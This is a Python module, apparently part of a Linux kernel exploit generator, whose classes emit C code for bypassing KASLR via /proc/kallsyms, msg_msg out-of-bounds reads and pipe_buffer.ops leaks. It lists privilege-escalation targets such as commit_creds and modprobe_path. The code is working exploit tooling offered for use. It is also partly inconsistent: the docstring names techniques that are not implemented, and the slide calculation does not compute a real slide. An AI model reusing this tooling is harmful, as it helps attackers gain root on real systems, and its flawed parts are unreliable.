"""KASLR bypass and kernel address resolution strategies.

This module provides techniques for resolving kernel addresses when
KASLR is enabled.  Each technique is represented as a class with a
``generate_c()`` method that emits the C source code fragment to be
embedded in the generated exploit.

Techniques implemented
----------------------
* KallsymsLeak        - Read /proc/kallsyms when kptr_restrict allows it
* EntryBlobLeak       - Infer KASLR slide from CPU entry area (requires
                        specific kernel versions and an initial info leak)
* MsgMsgOOBLeak       - Abuse msg_msg out-of-bounds read to leak slab
                        metadata / pointers (requires a triggerable OOB)
* PrefetchSideChannel - CPU prefetch timing side-channel (unreliable on
                        modern kernels with KPTI, included for completeness)
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional


# ---------------------------------------------------------------------------
# Kernel symbol database
# ---------------------------------------------------------------------------

# Well-known symbols that exploits commonly need.  The offsets are filled
# in at runtime once the KASLR base is resolved.
REQUIRED_SYMBOLS = [
    "commit_creds",
    "prepare_kernel_cred",
    "find_task_by_vpid",
    "init_cred",
    "init_nsproxy",
    "init_task",
    "swapgs_restore_regs_and_return_to_usermode",  # for kROP returns
    "msleep",
    "native_write_cr4",
    "core_pattern",        # modprobe_path alternative
    "modprobe_path",
    "__x64_sys_getuid",    # for locating syscall table
]


@dataclass
class ResolvedSymbols:
    """Container for resolved kernel virtual addresses."""

    kaslr_base: int = 0
    kaslr_slide: int = 0
    text_base: int = 0             # _stext
    symbols: dict = field(default_factory=dict)  # name -> address

    @property
    def commit_creds(self) -> int:
        return self.symbols.get("commit_creds", 0)

    @property
    def prepare_kernel_cred(self) -> int:
        return self.symbols.get("prepare_kernel_cred", 0)

    @property
    def init_cred(self) -> int:
        return self.symbols.get("init_cred", 0)

    @property
    def swapgs_return(self) -> int:
        return self.symbols.get(
            "swapgs_restore_regs_and_return_to_usermode", 0
        )


# ---------------------------------------------------------------------------
# Leak technique: /proc/kallsyms
# ---------------------------------------------------------------------------

class KallsymsLeak:
    """Resolve symbols from /proc/kallsyms.

    Requires:
        - kptr_restrict == 0, OR
        - Running as root (CAP_SYSLOG), OR
        - kptr_restrict == 1 and we have CAP_SYSLOG (e.g. after initial
          escalation or in a permissive config).

    This is the simplest and most reliable technique when available.
    """

    technique_name = "kallsyms"

    def __init__(self, symbols: Optional[list[str]] = None):
        self.symbols = symbols or REQUIRED_SYMBOLS

    def generate_c(self) -> str:
        """Generate C code that reads /proc/kallsyms and resolves symbols."""
        sym_list = ", ".join(f'"{s}"' for s in self.symbols)
        return f'''\
/* --- KASLR bypass: /proc/kallsyms --- */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define KALLSYMS_PATH "/proc/kallsyms"
#define MAX_SYMBOLS {len(self.symbols)}

static const char *target_symbols[MAX_SYMBOLS] = {{ {sym_list} }};
static unsigned long resolved_addrs[MAX_SYMBOLS];

static int resolve_kallsyms(void) {{
    FILE *fp = fopen(KALLSYMS_PATH, "r");
    if (!fp) {{
        perror("fopen kallsyms");
        return -1;
    }}

    char line[256];
    int found = 0;

    while (fgets(line, sizeof(line), fp) && found < MAX_SYMBOLS) {{
        unsigned long addr;
        char type;
        char name[128];

        if (sscanf(line, "%lx %c %127s", &addr, &type, name) != 3)
            continue;

        /* Skip zeroed-out entries (kptr_restrict active) */
        if (addr == 0)
            continue;

        for (int i = 0; i < MAX_SYMBOLS; i++) {{
            if (resolved_addrs[i] == 0 && strcmp(name, target_symbols[i]) == 0) {{
                resolved_addrs[i] = addr;
                found++;
                break;
            }}
        }}
    }}

    fclose(fp);
    return found;
}}

static unsigned long get_symbol(const char *name) {{
    for (int i = 0; i < MAX_SYMBOLS; i++) {{
        if (strcmp(target_symbols[i], name) == 0)
            return resolved_addrs[i];
    }}
    return 0;
}}

static unsigned long kaslr_slide(void) {{
    /* _stext is typically the first kernel text symbol */
    unsigned long stext = get_symbol("commit_creds");
    if (stext == 0) return 0;
    /* The unrandomized base for x86_64 is 0xffffffff81000000 */
    /* commit_creds offset varies, so we compute relative slide */
    return stext & 0xfffff00000000000UL;
}}
/* --- end kallsyms --- */
'''

    def applicable(self, fingerprint) -> bool:
        """Check if this technique is usable on the target."""
        return (
            fingerprint.kallsyms_readable
            or fingerprint.kptr_restrict == 0
        )


# ---------------------------------------------------------------------------
# Leak technique: msg_msg OOB read
# ---------------------------------------------------------------------------

class MsgMsgOOBLeak:
    """Leak kernel heap pointers via msg_msg out-of-bounds read.

    Requires:
        - An OOB read primitive (e.g., corrupted msg_msg.m_ts)
        - Heap grooming to place a target object adjacent to the msg_msg

    This technique is commonly used when:
    1. The vulnerability gives an OOB write that can corrupt msg_msg.m_ts
    2. A subsequent msgrcv() reads past the msg_msg boundary
    3. The adjacent object contains kernel pointers (e.g., pipe_buffer.ops)
    """

    technique_name = "msg_msg_oob"

    def generate_c(self) -> str:
        return '''\
/* --- KASLR bypass: msg_msg OOB read --- */
#include <sys/ipc.h>
#include <sys/msg.h>

struct msg_leak {
    long mtype;
    char mtext[4096];
};

/*
 * After corrupting msg_msg.m_ts to a larger value, call msgrcv()
 * to read out-of-bounds from the slab object.  The leaked data
 * from the adjacent object can contain kernel .text or heap pointers
 * which reveal the KASLR base.
 */
static int leak_via_msg_msg(int msqid, unsigned long *leaked_ptr) {
    struct msg_leak msg;

    /* msgrcv with a size larger than the actual msg_msg.m_ts
     * (which we previously corrupted) will copy adjacent slab data */
    ssize_t ret = msgrcv(msqid, &msg, sizeof(msg.mtext), 0, IPC_NOWAIT | MSG_NOERROR);
    if (ret < 0) {
        perror("msgrcv");
        return -1;
    }

    /* Scan the received data for kernel pointers.
     * Kernel text addresses on x86_64 start with 0xffffffff8.
     * Kernel heap addresses start with 0xffff8880 or 0xffff888. */
    unsigned long *data = (unsigned long *)msg.mtext;
    size_t count = ret / sizeof(unsigned long);

    for (size_t i = 0; i < count; i++) {
        /* Kernel text pointer heuristic */
        if ((data[i] & 0xffffffff00000000UL) == 0xffffffff00000000UL) {
            *leaked_ptr = data[i];
            return 0;
        }
        /* Kernel heap pointer heuristic */
        if ((data[i] & 0xffff000000000000UL) == 0xffff000000000000UL) {
            *leaked_ptr = data[i];
            return 0;
        }
    }

    return -1;  /* No kernel pointer found in leaked data */
}
/* --- end msg_msg OOB --- */
'''

    def applicable(self, fingerprint) -> bool:
        # Requires an OOB primitive - always potentially applicable
        return True


# ---------------------------------------------------------------------------
# Leak technique: pipe_buffer.ops
# ---------------------------------------------------------------------------

class PipeBufferOpsLeak:
    """Leak kernel text address via pipe_buffer->ops function pointer.

    When a pipe_buffer object is placed adjacent to a vulnerable object
    in the same slab cache, corrupting/leaking the `ops` field reveals
    a kernel .text pointer (anon_pipe_buf_ops).

    This is one of the most reliable techniques for recent kernels.
    """

    technique_name = "pipe_buffer_ops"

    def generate_c(self) -> str:
        return '''\
/* --- KASLR bypass: pipe_buffer.ops leak --- */
#include <unistd.h>
#include <fcntl.h>

/*
 * struct pipe_buffer (simplified) in the kernel:
 *   struct page *page;                 // 8 bytes
 *   unsigned int offset;               // 4 bytes
 *   unsigned int len;                  // 4 bytes
 *   const struct pipe_buf_operations *ops;  // 8 bytes  <-- kernel .text ptr
 *   unsigned int flags;                // 4 bytes
 *   unsigned long private;             // 8 bytes
 *
 * The `ops` field points to anon_pipe_buf_ops or other static
 * kernel structures.  If we can read this via cross-object OOB,
 * we get the KASLR base.
 *
 * Unrandomized offset of anon_pipe_buf_ops is kernel-version-specific.
 * Subtract the known offset from the leaked pointer to get the slide.
 */

struct pipe_buf_leaked {
    unsigned long page;
    unsigned int offset;
    unsigned int len;
    unsigned long ops;   /* This is the kernel .text pointer */
    unsigned int flags;
    unsigned long priv;
};

static int setup_pipe_targets(int pipe_fds[][2], int count) {
    for (int i = 0; i < count; i++) {
        if (pipe(pipe_fds[i]) < 0) return -1;
        /* Write to allocate pipe_buffer in the slab */
        write(pipe_fds[i][1], "A", 1);
    }
    return 0;
}

static unsigned long extract_pipe_ops(void *leaked_data) {
    struct pipe_buf_leaked *pb = (struct pipe_buf_leaked *)leaked_data;
    return pb->ops;
}
/* --- end pipe_buffer.ops leak --- */
'''

    def applicable(self, fingerprint) -> bool:
        return True


# ---------------------------------------------------------------------------
# Strategy selector
# ---------------------------------------------------------------------------

ALL_TECHNIQUES = [
    KallsymsLeak,
    PipeBufferOpsLeak,
    MsgMsgOOBLeak,
]


def select_leak_strategy(fingerprint) -> list:
    """Given a kernel fingerprint, return applicable leak techniques
    ordered by reliability.

    Returns a list of technique instances.
    """
    applicable = []
    for cls in ALL_TECHNIQUES:
        t = cls()
        if t.applicable(fingerprint):
            applicable.append(t)
    return applicable
